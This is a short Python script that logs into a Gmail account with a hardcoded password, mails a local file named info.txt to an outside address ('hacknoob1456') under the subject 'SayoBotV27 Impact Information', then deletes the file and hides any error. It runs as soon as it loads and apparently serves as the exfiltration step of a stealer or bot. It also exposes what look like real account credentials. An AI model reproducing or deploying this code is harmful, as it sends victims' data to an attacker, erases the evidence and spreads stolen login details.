import os
import yagmail

def send_email_with_deletion():
    try:
        current_directory = os.path.dirname(__file__)

        file1_path = os.path.join(current_directory, 'info.txt')

        yag = yagmail.SMTP('yuriyoumuhakirie@gmail.com', 'jeykabrazsmrlrbk')

        to = 'hacknoob1456@gmail.com'
        subject = 'SayoBotV27 Impact Information'
        body = 'AutomaticMail from 119.220.755.86:'
        attachments = [file1_path]  

        yag.send(to=to, subject=subject, contents=body, attachments=attachments)

        for file_path in [file1_path]:
            os.remove(file_path)
        return True

    except Exception as e:
        print('a')
        return False
    
send_email_with_deletion()
